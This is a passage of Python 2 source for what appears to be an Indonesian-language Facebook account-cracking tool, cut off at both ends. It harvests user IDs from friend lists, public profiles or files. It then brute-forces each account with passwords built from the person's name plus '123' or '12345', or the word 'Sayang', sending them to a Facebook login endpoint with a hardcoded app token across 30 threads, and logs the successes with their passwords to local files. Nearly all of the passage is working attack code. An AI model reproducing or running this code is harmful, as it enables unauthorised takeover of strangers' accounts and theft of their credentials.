                                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos7
                                        oke = open('done/japan.txt', 'a')
                                        oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos7 + '\n')
                                        oke.close()
                                        oks.append(zowe)
                                    elif 'www.facebook.com' in ko['error_msg']:
                                        print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;93mCEKPOINT'
                                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos7
                                        cek = open('done/japan.txt', 'a')
                                        cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos7 + '\n')
                                        cek.close()
                                        cekpoint.append(zowe)
                                    else:
                                        bos8 = j['last_name'].lower() + '12345'
                                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                        ko = json.load(data)
                                        if 'access_token' in ko:
                                            print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;92mBERHASIL'
                                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos8
                                            oke = open('done/japan.txt', 'a')
                                            oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos8 + '\n')
                                            oke.close()
                                            oks.append(zowe)
                                        elif 'www.facebook.com' in ko['error_msg']:
                                            print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;93mCEKPOINT'
                                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos8
                                            cek = open('done/japan.txt', 'a')
                                            cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos8 + '\n')
                                            cek.close()
                                            cekpoint.append(zowe)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\n\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;97mSelesai ...'
    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;97mTotal \x1b[1;92mOK\x1b[1;97m/\x1b[1;93mCP \x1b[1;97m: \x1b[1;92m' + str(len(oks)) + '\x1b[1;97m/\x1b[1;93m' + str(len(cekpoint))
    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;97mSalin hasil crack lalu simpan\x1b[1;91m : \x1b[1;97mdone japan.'
    print 50 * '\x1b[1;94m\xe2\x94\x80'
    raw_input('\x1b[1;97m(\x1b[1;91mKembali\x1b[1;97m) ')
    os.system('python2 Crackv1.py')


def crack_singa():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;97m(\x1b[1;91m!\x1b[1;97m) Token invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        keluar()

    os.system('clear')
    print ' '
    print '\x1b[1;91m _________   ________.    '
    print '\x1b[1;97m \\_   ___ \\_/ ____\\_ |__   \x1b[1;97m[\x1b[1;94m M\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mMulti'
    print '\x1b[1;91m /    \\  \\/\\   __\\ | __ \\  \x1b[1;97m[\x1b[1;94m B\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mBrute'
    print '\x1b[1;97m \\     \\____|  |   | \\_\\ \\ \x1b[1;97m[\x1b[1;94m F\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mForce'
    print '\x1b[1;97m  \\______  /|__|   |___  /'
    print '\x1b[1;97m         \\/            \\/ '
    print 50 * '\x1b[1;94m\xe2\x94\x80'
    print '\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\x1b[1;97m(\x1b[1;93mSingapura\x1b[1;97m)\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    print 50 * '\x1b[1;94m\xe2\x94\x80'
    print '\x1b[1;94m(\x1b[1;97m1\x1b[1;94m) \x1b[1;97mCrack Dari Daftar Teman'
    print '\x1b[1;94m(\x1b[1;97m2\x1b[1;94m)\x1b[1;97m Crack Dari Id Teman/Publik'
    print '\x1b[1;94m(\x1b[1;97m3\x1b[1;94m)\x1b[1;97m Crack Dari File'
    print '\x1b[1;94m(\x1b[1;91m0\x1b[1;94m) \x1b[1;97mKembali'
    print 50 * '\x1b[1;94m\xe2\x94\x80'
    pilih_singa()


def pilih_singa():
    teak = raw_input('\x1b[1;97m(?) Pilih \x1b[94m> \x1b[1;97m ')
    if teak == '':
        print '\x1b[1;97m(\x1b[1;91m!\x1b[1;97m) Isi Yg Benar Sayang!'
        pilih_singa()
    else:
        if teak == '1' or teak == '01':
            os.system('clear')
            print ' '
            print '\x1b[1;91m _________   ________.    '
            print '\x1b[1;97m \\_   ___ \\_/ ____\\_ |__   \x1b[1;97m[\x1b[1;94m M\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mMulti'
            print '\x1b[1;91m /    \\  \\/\\   __\\ | __ \\  \x1b[1;97m[\x1b[1;94m B\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mBrute'
            print '\x1b[1;97m \\     \\____|  |   | \\_\\ \\ \x1b[1;97m[\x1b[1;94m F\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mForce'
            print '\x1b[1;97m  \\______  /|__|   |___  /'
            print '\x1b[1;97m         \\/            \\/ '
            print 50 * '\x1b[1;94m\xe2\x94\x80'
            print '             \x1b[1;94m>>> \x1b[1;93mCRACK SINGAPURA \x1b[1;94m<<<'
            print 50 * '\x1b[1;94m\xe2\x94\x80'
            r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
            z = json.loads(r.text)
            for s in z['data']:
                id.append(s['id'])

        elif teak == '2' or teak == '02':
            os.system('clear')
            print ' '
            print '\x1b[1;91m _________   ________.    '
            print '\x1b[1;97m \\_   ___ \\_/ ____\\_ |__   \x1b[1;97m[\x1b[1;94m M\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mMulti'
            print '\x1b[1;91m /    \\  \\/\\   __\\ | __ \\  \x1b[1;97m[\x1b[1;94m B\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mBrute'
            print '\x1b[1;97m \\     \\____|  |   | \\_\\ \\ \x1b[1;97m[\x1b[1;94m F\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mForce'
            print '\x1b[1;97m  \\______  /|__|   |___  /'
            print '\x1b[1;97m         \\/            \\/ '
            print 50 * '\x1b[1;94m\xe2\x94\x80'
            print '             \x1b[1;94m>>> \x1b[1;93mCRACK SINGAPURA \x1b[1;94m<<<'
            print 50 * '\x1b[1;94m\xe2\x94\x80'
            idt = raw_input('\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) ID Publik \x1b[1;91m:\x1b[1;97m ')
            try:
                pok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
                sp = json.loads(pok.text)
                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama Akun \x1b[1;91m:\x1b[1;97m ' + sp['name']
            except KeyError:
                print '\x1b[1;97m(\x1b[1;91m!\x1b[1;97m) ID publik Tidak Ada!'
                raw_input('\n\x1b[1;97m(\x1b[1;91mKembali\x1b[1;97m)')
                crack_indo()
            except requests.exceptions.ConnectionError:
                print '\x1b[1;97m(\x1b[1;91m!\x1b[1;97m) Tidak ada koneksi !'
                keluar()

            r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
            z = json.loads(r.text)
            for i in z['data']:
                id.append(i['id'])

        elif teak == '3' or teak == '03':
            os.system('clear')
            print ' '
            print '\x1b[1;91m _________   ________.    '
            print '\x1b[1;97m \\_   ___ \\_/ ____\\_ |__   \x1b[1;97m[\x1b[1;94m M\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mMulti'
            print '\x1b[1;91m /    \\  \\/\\   __\\ | __ \\  \x1b[1;97m[\x1b[1;94m B\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mBrute'
            print '\x1b[1;97m \\     \\____|  |   | \\_\\ \\ \x1b[1;97m[\x1b[1;94m F\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mForce'
            print '\x1b[1;97m  \\______  /|__|   |___  /'
            print '\x1b[1;97m         \\/            \\/ '
            try:
                print 50 * '\x1b[1;94m\xe2\x94\x80'
                print '             \x1b[1;94m>>> \x1b[1;93mCRACK SINGAPURA \x1b[1;94m<<<'
                print 50 * '\x1b[1;94m\xe2\x94\x80'
                idlist = raw_input('\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;97mNama File\x1b[1;91m :\x1b[1;97m ')
                for line in open(idlist, 'r').readlines():
                    id.append(line.strip())

            except KeyError:
                print '\x1b[1;97m(\x1b[1;91m!\x1b[1;97m) File tidak ada ! '
                raw_input('\n\x1b[1;97m(\x1b[1;91mKembali \x1b[1;97m)')
            except IOError:
                print '\x1b[1;97m(\x1b[1;91m!\x1b[1;97m) File tidak ada !'
                raw_input('\n\x1b[1;97m(\x1b[1;91mKembali\x1b[1;97m)')
                crack_singa()

        elif teak == '0' or teak == '00':
            menu()
        else:
            print '\x1b[1;97m(\x1b[1;91m!\x1b[1;97m) Isi Yg Benar Sayang!'
            pilih_singa()
        print '\x1b[0;97m(\x1b[0;94m\xe2\x80\xa2\x1b[0;97m) Total ID\x1b[1;91m  :\x1b[1;97m ' + str(len(id))
        titik = ['.   ', '..  ', '... ']
        for o in titik:
            print '\r\x1b[0;97m(\x1b[0;94m\xe2\x80\xa2\x1b[0;97m) Crack Berjalan ' + o,
            sys.stdout.flush()
            time.sleep(1)

    print '\n\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    print '\x1b[0;97m(\x1b[0;94m\xe2\x80\xa2\x1b[0;97m) UNTUK MENGHENTIKAN PROSES,TEKAN CTRL+Z PAHAM!\x1b[0m'
    print '\x1b[0;97m(\x1b[0;94m\xe2\x80\xa2\x1b[0;97m) TIDAK ADA HASIL GUNAKAN MODE PESAWAT 3 DETIK!\x1b[0m'
    print 50 * '\x1b[1;94m\xe2\x94\x80'

    def main(arg):
        zowe = arg
        try:
            sys.stdout.write(('\r{}').format(datetime.now().strftime('\x1b[1;96m%H\x1b[1;91m:\x1b[1;93m%M\x1b[1;91m:\x1b[1;92m%S')))
            sys.stdout.flush()
            os.mkdir('done')
        except OSError:
            pass

        try:
            an = requests.get('https://graph.facebook.com/' + zowe + '/?access_token=' + toket)
            j = json.loads(an.text)
            bos1 = j['first_name'].lower() + '123'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            ko = json.load(data)
            if 'access_token' in ko:
                print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;92mBERHASIL'
                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos1
                oke = open('done/singa.txt', 'a')
                oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos1 + '\n')
                oke.close()
                oks.append(zowe)
            elif 'www.facebook.com' in ko['error_msg']:
                print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;93mCEKPOINT'
                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos1
                cek = open('done/singa.txt', 'a')
                cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos1 + '\n')
                cek.close()
                cekpoint.append(zowe)
            else:
                bos2 = j['first_name'].lower() + '123'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                ko = json.load(data)
                if 'access_token' in ko:
                    print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;92mBERHASIL'
                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos2
                    oke = open('done/singa.txt', 'a')
                    oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos2 + '\n')
                    oke.close()
                    oks.append(zowe)
                elif 'www.facebook.com' in ko['error_msg']:
                    print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;93mCEKPOINT'
                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos2
                    cek = open('done/singa.txt', 'a')
                    cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos2 + '\n')
                    cek.close()
                    cekpoint.append(zowe)
                else:
                    bos3 = j['first_name'].lower() + '12345'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    ko = json.load(data)
                    if 'access_token' in ko:
                        print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;92mBERHASIL'
                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos3
                        oke = open('done/singa.txt', 'a')
                        oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos3 + '\n')
                        oke.close()
                        oks.append(zowe)
                    elif 'www.facebook.com' in ko['error_msg']:
                        print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;93mCEKPOINT'
                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos3
                        cek = open('done/singa.txt', 'a')
                        cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos3 + '\n')
                        cek.close()
                        cekpoint.append(zowe)
                    else:
                        bos4 = 'Sayang'
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        ko = json.load(data)
                        if 'access_token' in ko:
                            print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;92mBERHASIL'
                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos4
                            oke = open('done/singa.txt', 'a')
                            oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos4 + '\n')
                            oke.close()
                            oks.append(zowe)
                        elif 'www.facebook.com' in ko['error_msg']:
                            print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;93mCEKPOINT'
                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos4
                            cek = open('done/indo.txt', 'a')
                            cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos4 + '\n')
                            cek.close()
                            cekpoint.append(zowe)
                        else:
                            bos5 = 'Sayang'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            ko = json.load(data)
                            if 'access_token' in ko:
                                print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;92mBERHASIL'
                                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos5
                                oke = open('done/singa.txt', 'a')
                                oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos5 + '\n')
                                oke.close()
                                oks.append(zowe)
                            elif 'www.facebook.com' in ko['error_msg']:
                                print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;93mCEKPOINT'
                                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos5
                                cek = open('done/singa.txt', 'a')
                                cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos5 + '\n')
                                cek.close()
                                cekpoint.append(zowe)
                            else:
                                bos6 = j['first_name'].lower() + '123'
                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                ko = json.load(data)
                                if 'access_token' in ko:
                                    print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;92mBERHASIL'
                                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos6
                                    oke = open('done/singa.txt', 'a')
                                    oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos6 + '\n')
                                    oke.close()
                                    oks.append(zowe)
                                elif 'www.facebook.com' in ko['error_msg']:
                                    print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;93mCEKPOINT'
                                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos6
                                    cek = open('done/singa.txt', 'a')
                                    cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos6 + '\n')
                                    cek.close()
                                    cekpoint.append(zowe)
                                else:
                                    bos7 = j['first_name'].lower() + '12345'
                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                    ko = json.load(data)
                                    if 'access_token' in ko:
                                        print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;92mBERHASIL'
                                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos7
                                        oke = open('done/singa.txt', 'a')
                                        oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos7 + '\n')
                                        oke.close()
                                        oks.append(zowe)
                                    elif 'www.facebook.com' in ko['error_msg']:
                                        print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;93mCEKPOINT'
                                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos7
                                        cek = open('done/singa.txt', 'a')
